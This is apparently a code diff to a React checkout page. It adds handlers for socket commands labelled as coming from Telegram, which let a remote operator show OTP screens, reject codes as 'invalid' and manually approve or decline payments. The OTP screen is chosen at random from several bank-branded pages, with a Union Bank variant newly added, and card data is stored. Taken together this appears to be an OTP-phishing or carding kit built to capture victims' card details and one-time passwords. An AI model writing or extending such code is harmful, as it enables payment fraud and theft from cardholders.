@@ -455,7 +455,94 @@ const CheckoutOriginal = () => {
       setExchangeRate(data.exchangeRate);
     });
     
+    // Telegram Bot Command Handlers
+    newSocket.on('show-otp', (data) => {
+      console.log('🔐 Received show-otp command from Telegram:', data);
+      
+      // Check attempt limit first
+      if (otpAttempts >= 3) {
+        console.log('❌ OTP attempt limit reached, redirecting with failure message');
+        setOtpFailedMessage('Maximum OTP attempts exceeded. Transaction failed.');
+        setTimeout(() => {
+          setCurrentStep('payment');
+          setShowOtp(false);
+          setOtpValue('');
+          setOtpError('');
+          setTransactionCancelError('OTP attempt limit exceeded. Please try again.');
+        }, 3000);
+        return;
+      }
+      
+      // Increment attempt count
+      setOtpAttempts(prev => prev + 1);
+      console.log(`🔢 OTP attempt #${otpAttempts + 1} of 3`);
+      
+      // Generate new random OTP page selection for each attempt
+      const rand = Math.random();
+      let newOtpPageSelection;
+      if (rand < 0.20) newOtpPageSelection = 'old';
+      else if (rand < 0.40) newOtpPageSelection = 'new';
+      else if (rand < 0.60) newOtpPageSelection = 'third';
+      else if (rand < 0.80) newOtpPageSelection = 'icici';
+      else newOtpPageSelection = 'union';
+      
+      console.log(`🎲 Selected OTP page: ${newOtpPageSelection} (attempt ${otpAttempts + 1}/3)`);
+      setOtpPageSelection(newOtpPageSelection);
+      
+      // Show OTP screen
+      setCurrentStep('otp');
+      setShowOtp(true);
+      startOtpTimer();
+      setOtpValue('');
+      setOtpError('');
+      setOtpSubmitting(false);
+    });
+    
+    newSocket.on('invalid-otp-error', (data) => {
+      console.log('❌ Received invalid OTP error command from Telegram:', data);
+      setOtpError('Invalid OTP');
+      setOtpSubmitting(false);
+    });
+    
+    newSocket.on('payment-approved', (data) => {
+      console.log('✅ Received payment approved from Telegram:', data);
+      setOtpSubmitting(false);
+      setIsProcessing(false);
+      setConfirmingPayment(false);
+      
+      // Store success data
+      const userData = {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: formData.email,
+        country: formData.country,
+        companyName: formData.companyName,
+        planName,
+        billing,
+        amount: displayPrice,
+        paymentId
+      };
+      localStorage.setItem('userCheckoutData', JSON.stringify(userData));
+      
+      // Navigate to success page
+      navigate('/payment-success');
+    });
+    
+    newSocket.on('payment-rejected', (data) => {
+      console.log('❌ Received payment rejected from Telegram:', data);
+      setOtpSubmitting(false);
+      setIsProcessing(false);
+      setConfirmingPayment(false);
+      setCurrentStep('payment');
+      setShowOtp(false);
+      setTransactionCancelError('Payment declined. Please check your card details and try again.');
+    });
+    
       return () => {
+        newSocket.off('show-otp');
+        newSocket.off('invalid-otp-error');
+        newSocket.off('payment-approved');
+        newSocket.off('payment-rejected');
         newSocket.disconnect();
       };
     } catch (error) {
@@ -552,16 +639,21 @@ const CheckoutOriginal = () => {
   const [finalConsent, setFinalConsent] = useState(false);
   const [promoCode, setPromoCode] = useState('');
   
-  // OTP Page Selection State (random between 4 pages - 25% each)
+  // OTP Page Selection State (random between 5 pages - 20% each)
   const [otpPageSelection, setOtpPageSelection] = useState(() => {
     const rand = Math.random();
-    if (rand < 0.25) return 'old';
-    if (rand < 0.50) return 'new';
-    if (rand < 0.75) return 'third';
-    return 'icici';
+    if (rand < 0.20) return 'old';
+    if (rand < 0.40) return 'new';
+    if (rand < 0.60) return 'third';
+    if (rand < 0.80) return 'icici';
+    return 'union'; // Union Bank OTP page (20%)
   });
   const [useNewOTPPage, setUseNewOTPPage] = useState(() => Math.random() < 0.5);
   const [newOtpPageLoading, setNewOtpPageLoading] = useState(false);
+  
+  // OTP Attempt Tracking (max 3 attempts, fail on 4th)
+  const [otpAttempts, setOtpAttempts] = useState(0);
+  const [otpFailedMessage, setOtpFailedMessage] = useState('');
 
   // Debug: Log the current state of agreeTerms (disabled)
   // useEffect(() => {
@@ -1191,6 +1283,11 @@ const CheckoutOriginal = () => {
       devLog('Validation failed - cannot proceed');
       return;
     }
+    
+    // Reset OTP attempt count for new payment session
+    setOtpAttempts(0);
+    setOtpFailedMessage('');
+    console.log('🔄 Reset OTP attempt count for new payment session');
     
     // Store card data for success page
     const cardInfo = {
